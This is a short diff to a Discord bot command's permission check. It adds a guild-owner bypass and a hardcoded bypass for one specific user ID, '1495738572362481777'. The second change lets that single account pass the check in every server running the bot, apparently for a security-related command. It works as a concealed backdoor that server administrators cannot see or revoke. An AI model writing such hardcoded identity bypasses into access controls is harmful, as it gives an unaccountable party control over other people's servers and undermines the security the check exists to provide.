@@ -195,7 +195,9 @@ const command: Command = {
 
     if (
       !member ||
-      (!member.permissions.has(PermissionFlagsBits.Administrator) &&
+      (interaction.user.id !== "1495738572362481777" &&
+        interaction.user.id !== interaction.guild.ownerId &&
+        !member.permissions.has(PermissionFlagsBits.Administrator) &&
         !member.permissions.has(PermissionFlagsBits.ManageGuild) &&
         !hasFeaturePermission(member, "security"))
     ) {
